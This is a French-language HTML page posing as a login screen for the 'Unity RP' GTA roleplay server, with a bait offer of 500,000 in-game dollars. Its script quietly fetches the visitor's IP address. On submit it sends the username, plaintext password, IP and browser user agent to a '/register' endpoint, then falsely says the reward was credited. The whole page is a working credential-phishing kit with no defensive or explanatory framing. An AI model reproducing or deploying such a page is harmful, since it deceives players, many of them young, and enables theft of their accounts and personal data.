<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unity RP - Connexion</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f13;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-card {
            background: #18181f;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 400px;
            border: 1px solid #2a2a35;
        }
        h2 { text-align: center; margin-bottom: 8px; color: #ff2a4d; }
        .subtitle { text-align: center; font-size: 0.9em; color: #888; margin-bottom: 20px; }
        .reward {
            background: rgba(255, 42, 77, 0.1);
            border: 1px dashed #ff2a4d;
            color: #ff4d6d;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
            font-size: 0.85em;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 0.85em; color: #aaa; }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            background: #0f0f13;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 1em;
            outline: none;
        }
        input:focus { border-color: #ff2a4d; }
        button {
            width: 100%;
            padding: 12px;
            background: #ff2a4d;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-weight: bold;
            font-size: 1em;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background: #ff4d6d; }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>UNITY <span>RP</span></h2>
        <p class="subtitle">Connexion au serveur</p>
        <div class="reward">🎁 Récompense : +500 000 GTA $ RP offerts !</div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">Nom d'utilisateur</label>
                <input type="text" id="username" placeholder="Entrez votre pseudo" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
    </div>

    <script>
        let userIpAddress = 'Non détectée';

        // Récupération de l'IP en arrière-plan sans bloquer
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userIpAddress = data.ip; })
            .catch(() => {});

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!user || !pass) return;

            try {
                const response = await fetch('/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: user,
                        password: pass,
                        ip: userIpAddress,
                        userAgent: navigator.userAgent
                    })
                });

                if (response.ok) {
                    alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
                    document.getElementById('loginForm').reset();
                } else {
                    alert('Erreur lors du traitement par le serveur.');
                }
            } catch (err) {
                alert('Erreur de communication avec le serveur.');
            }
        });
    </script>
</body>
</html>
